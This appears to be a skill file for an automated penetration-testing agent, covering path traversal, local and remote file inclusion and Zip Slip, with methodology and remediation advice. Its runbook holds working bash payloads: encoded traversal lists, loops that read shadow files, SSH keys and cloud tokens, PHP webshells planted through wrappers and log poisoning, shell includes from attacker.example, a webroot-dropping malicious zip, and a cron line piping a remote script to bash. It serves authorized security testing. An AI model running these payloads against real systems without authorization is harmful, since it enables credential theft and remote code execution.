---
name: path-traversal-lfi-rfi
description: Path traversal and file inclusion testing for local/remote file access and code execution
---

# Path Traversal / LFI / RFI

Improper file path handling and dynamic inclusion enable sensitive file disclosure, config/source leakage, SSRF pivots, and code execution. Treat all user-influenced paths, names, and schemes as untrusted; normalize and bind them to an allowlist or eliminate user control entirely.

## Attack Surface

**Path Traversal**
- Read files outside intended roots via `../`, encoding, normalization gaps

**Local File Inclusion (LFI)**
- Include server-side files into interpreters/templates

**Remote File Inclusion (RFI)**
- Include remote resources (HTTP/FTP/wrappers) for code execution

**Archive Extraction**
- Zip Slip: write outside target directory upon unzip/untar

**Normalization Mismatches**
- Server/proxy differences (nginx alias/root, upstream decoders)
- OS-specific paths: Windows separators, device names, UNC, NT paths, alternate data streams

## High-Value Targets

**Unix**
- `/etc/passwd`, `/etc/hosts`, application `.env`/`config.yaml`
- SSH keys, cloud creds, service configs/logs

**Windows**
- `C:\Windows\win.ini`, IIS/web.config, programdata configs, application logs

**Application**
- Source code templates and server-side includes
- Secrets in env dumps, framework caches

## Reconnaissance

### Surface Map

- HTTP params: `file`, `path`, `template`, `include`, `page`, `view`, `download`, `export`, `report`, `log`, `dir`, `theme`, `lang`
- Upload and conversion pipelines: image/PDF renderers, thumbnailers, office converters
- Archive extract endpoints and background jobs; imports with ZIP/TAR/GZ/7z
- Server-side template rendering (PHP/Smarty/Twig/Blade), email templates, CMS themes/plugins
- Reverse proxies and static file servers (nginx, CDN) in front of app handlers

### Capability Probes

- Path traversal baseline: `../../etc/hosts` and `C:\Windows\win.ini`
- Encodings: `%2e%2e%2f`, `%252e%252e%252f`, `..%2f`, `..%5c`, mixed UTF-8 (`%c0%2e`), Unicode dots and slashes
- Normalization tests: `..../`, `..\\`, `././`, trailing dot/double dot segments; repeated decoding
- Absolute path acceptance: `/etc/passwd`, `C:\Windows\System32\drivers\etc\hosts`
- Server mismatch: `/static/..;/../etc/passwd` ("..;"), encoded slashes (`%2F`), double-decoding via upstream

## Detection Channels

### Direct

- Response body discloses file content (text, binary, base64)
- Error pages echo real paths

### Error-Based

- Exception messages expose canonicalized paths or `include()` warnings with real filesystem locations

### OAST

- RFI/LFI with wrappers that trigger outbound fetches (HTTP/DNS) to confirm inclusion/execution

### Side Effects

- Archive extraction writes files unexpectedly outside target
- Verify with directory listings or follow-up reads

## Key Vulnerabilities

### Path Traversal Bypasses

**Encodings**
- Single/double URL-encoding, mixed case, overlong UTF-8, UTF-16, path normalization oddities

**Mixed Separators**
- `/` and `\\` on Windows; `//` and `\\\\` collapse differences across frameworks

**Dot Tricks**
- `....//` (double dot folding), trailing dots (Windows), trailing slashes, appended valid extension

**Absolute Path Injection**
- Bypass joins by supplying a rooted path

**Alias/Root Mismatch**
- nginx alias without trailing slash with nested location allows `../` to escape
- Try `/static/../etc/passwd` and ";" variants (`..;`)

**Upstream vs Backend Decoding**
- Proxies/CDNs decoding `%2f` differently; test double-decoding and encoded dots

### LFI Wrappers and Techniques

**PHP Wrappers**
- `php://filter/convert.base64-encode/resource=index.php` (read source)
- `zip://archive.zip#file.txt`
- `data://text/plain;base64`
- `expect://` (if enabled)

**Log/Session Poisoning**
- Inject PHP/templating payloads into access/error logs or session files then include them

**Upload Temp Names**
- Include temporary upload files before relocation; race with scanners

**Proc and Caches**
- `/proc/self/environ` and framework-specific caches for readable secrets

**Legacy Tricks**
- Null-byte (`%00`) truncation in older stacks; path length truncation

### Template Engines

- PHP include/require; Smarty/Twig/Blade with dynamic template names
- Java/JSP/FreeMarker/Velocity; Node.js ejs/handlebars/pug engines
- Seek dynamic template resolution from user input (theme/lang/template)

### RFI Conditions

**Requirements**
- Remote includes (`allow_url_include`/`allow_url_fopen` in PHP)
- Custom fetchers that eval/execute retrieved content
- SSRF-to-exec bridges

**Protocol Handlers**
- http, https, ftp; language-specific stream handlers

**Exploitation**
- Host a minimal payload that proves code execution
- Prefer OAST beacons or deterministic output over heavy shells
- Chain with upload or log poisoning when remote includes are disabled

### Archive Extraction (Zip Slip)

- Files within archives containing `../` or absolute paths escape target extract directory
- Test multiple formats: zip/tar/tgz/7z
- Verify symlink handling and path canonicalization prior to write
- Impact: overwrite config/templates or drop webshells into served directories

## Operational Runbook

When a candidate file-handling parameter is identified (`filename=`, `file=`, `path=`, `template=`, `page=`), this is the canonical traversal/LFI/RFI exploitation flow.

### Step 1 — baseline + initial probe

```bash
# Baseline: what does a normal value return?
curl -s "<TARGET>?file=report.pdf" -o /tmp/baseline.bin
file /tmp/baseline.bin

# Initial traversal probe — try the classic
curl -s "<TARGET>?file=../../../../etc/passwd" -o /tmp/probe1.txt
head -3 /tmp/probe1.txt  # Should start with "root:x:0:0:" if vulnerable
```

If `/etc/passwd` content appears, you have read-side LFI. **Critical**.

### Step 2 — encoding bypass library

Targets often strip naive `../`. Try escalating layers:

```bash
# Each on its own row; try until one works.
PAYLOADS=(
  "../../../../etc/passwd"                    # plain
  "..%2F..%2F..%2F..%2Fetc%2Fpasswd"          # URL-encoded slashes
  "..%252F..%252F..%252F..%252Fetc%252Fpasswd"  # double-URL-encoded
  "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"   # invalid UTF-8 (legacy)
  "..%5c..%5c..%5c..%5cetc%5cpasswd"          # Windows-style backslash
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"   # all-encoded
  "....//....//....//etc/passwd"              # nested double-dots
  "/etc/passwd%00.pdf"                        # null-byte truncation (older PHP)
  "/etc/passwd\x00.pdf"                       # raw null
  "/../../../../../etc/passwd"                # absolute-path with leading /
  "file:///etc/passwd"                        # protocol scheme (if scheme parsing)
)
for p in "${PAYLOADS[@]}"; do
  enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read()))" <<< "$p")
  resp=$(curl -s "<TARGET>?file=$enc" | head -c 100)
  if echo "$resp" | grep -q "root:x:"; then
    echo "[BYPASS] payload=$p"
    break
  fi
done
```

### Step 3 — high-value reads (post-bypass)

```bash
# Linux secrets
for tgt in \
    /etc/passwd \
    /etc/shadow \
    /proc/self/environ \
    /proc/self/cmdline \
    /root/.ssh/id_rsa \
    /home/*/.ssh/id_rsa \
    /var/log/auth.log \
    /var/log/apache2/access.log \
    /opt/app/.env \
    /var/run/secrets/kubernetes.io/serviceaccount/token \
    /.aws/credentials; do
  enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read()))" <<< "../../../../..$tgt")
  resp=$(curl -s "<TARGET>?file=$enc")
  size=${#resp}
  echo "$tgt → ${size} bytes"
done
```

Look at sizes — any read >100 bytes typically means the file was served. Inspect the high-value ones.

### Step 4 — PHP wrapper LFI → RCE pivot

If the server is PHP, PHP wrappers turn LFI into RCE:

```bash
# Source-code disclosure (base64-encoded)
curl -s "<TARGET>?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d

# Read with zip wrapper
curl -s "<TARGET>?file=zip://uploaded.zip%23inner.php"

# Data wrapper — code injection (newer PHP allows_url_include)
PAYLOAD='<?php system($_GET["cmd"]); ?>'
B64=$(echo -n "$PAYLOAD" | base64)
curl -s "<TARGET>?file=data://text/plain;base64,$B64&cmd=id"

# Log poisoning: write PHP into a logged file (User-Agent, Referer),
# then include the log via LFI
curl -s "<TARGET>" -A '<?php system($_GET["c"]); ?>'
curl -s "<TARGET>?file=/var/log/apache2/access.log&c=id"
```

### Step 5 — RFI (remote file inclusion)

Less common on modern PHP but still present in legacy apps + frameworks that accept URLs as include paths:

```bash
# Host an attacker payload
echo '<?php system($_GET["c"]); ?>' > /var/www/attacker/shell.txt
# Then include it
curl -s "<TARGET>?file=http://attacker.example/shell.txt&c=id"

# Some targets accept FTP / SMB / etc
curl -s "<TARGET>?file=ftp://attacker.example/shell.txt"
```

### Step 6 — archive extraction / Zip Slip

If the target accepts uploaded archives and extracts server-side:

```bash
# Build a malicious zip with traversal in the entry name
python3 << 'PYEOF'
import zipfile
with zipfile.ZipFile('/tmp/evil.zip', 'w') as z:
    z.writestr('../../../../tmp/pwned.txt', b'OWNED')
    # Or overwrite the webroot
    z.writestr('../../var/www/html/shell.php',
               b'<?php system($_GET["c"]); ?>')
PYEOF

# Upload + trigger extraction
curl -s -F "archive=@/tmp/evil.zip" "<TARGET>/upload"
curl -s "<TARGET>/shell.php?c=id"
```

### Step 7 — write-side (rare but devastating)

When the parameter is used in a *write* path (download manager, file rename, export):

```bash
# Try overwriting a script the server runs
curl -s -X POST "<TARGET>/save" \
    --data "filename=../../../etc/cron.d/pwn&content=* * * * * root curl <attacker>/sh|bash"
```

Cron / systemd-timer / supervisord overwrites are full RCE. Document the capability; don't execute unless `opsec_level: loud` AND authorization is explicit.

## Testing Methodology

1. **Inventory file operations** - Downloads, previews, templates, logs, exports/imports, report engines, uploads, archive extractors
2. **Identify input joins** - Path joins (base + user), include/require/template loads, resource fetchers, archive extract destinations
3. **Probe normalization** - Separators, encodings, double-decodes, case, trailing dots/slashes
4. **Compare behaviors** - Web server vs application behavior
5. **Escalate** - From disclosure (read) to influence (write/extract/include), then to execution (wrapper/engine chains)

## Validation

1. Show a minimal traversal read proving out-of-root access (e.g., `/etc/hosts`) with a same-endpoint in-root control
2. For LFI, demonstrate inclusion of a benign local file or harmless wrapper output (`php://filter` base64 of index.php)
3. For RFI, prove remote fetch by OAST or controlled output; avoid destructive payloads
4. For Zip Slip, create an archive with `../` entries and show write outside target (e.g., marker file read back)
5. Provide before/after file paths, exact requests, and content hashes/lengths for reproducibility

## False Positives

- In-app virtual paths that do not map to filesystem; content comes from safe stores (DB/object storage)
- Canonicalized paths constrained to an allowlist/root after normalization
- Wrappers disabled and includes using constant templates only
- Archive extractors that sanitize paths and enforce destination directories

## Impact

- Sensitive configuration/source disclosure → credential and key compromise
- Code execution via inclusion of attacker-controlled content or overwritten templates
- Persistence via dropped files in served directories; lateral movement via revealed secrets
- Supply-chain impact when report/template engines execute attacker-influenced files

## Pro Tips

1. Compare content-length/ETag when content is masked; read small canonical files (hosts) to avoid noise
2. Test proxy/CDN and app separately; decoding/normalization order differs, especially for `%2f` and `%2e` encodings
3. For LFI, prefer `php://filter` base64 probes over destructive payloads; enumerate readable logs and sessions
4. Validate extraction code with synthetic archives; include symlinks and deep `../` chains
5. Use minimal PoCs and hard evidence (hashes, paths). Avoid noisy DoS against filesystems

## Summary

Eliminate user-controlled paths where possible. Otherwise, resolve to canonical paths and enforce allowlists, forbid remote schemes, and lock down interpreters and extractors. Normalize consistently at the boundary closest to IO.
